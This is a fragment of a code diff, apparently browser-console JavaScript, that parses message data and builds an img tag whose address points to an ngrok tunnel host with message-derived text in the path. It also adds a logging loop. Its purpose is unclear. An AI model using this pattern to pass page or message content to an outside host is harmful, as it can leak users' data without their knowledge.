@@ -63,6 +63,8 @@ temp1.parentNode.parentNode.childNodes[1].childNodes[0].childNodes[0].src
 
 e1 ='<img width=300 src="https://866196a35a9f.ngrok-free.app/upload/'+encodeURI( JSON.parse(a_msg[12])[1].r[2].substr(6) )+'">' 
 
+for(i in ta){if(i==0)p=e.substr(0,ta[i][0]);else p=e.substr(ta[i-1][0]+ta[i-1][1]+7,ta[i][0]-(ta[i-1][0]+ta[i-1][1]+7));q=encodeURI( JSON.parse(a_msg[12])[1].r[i].substr(6) );console.log(p,q)} 
+
 // ====
 
 // post message from parent console
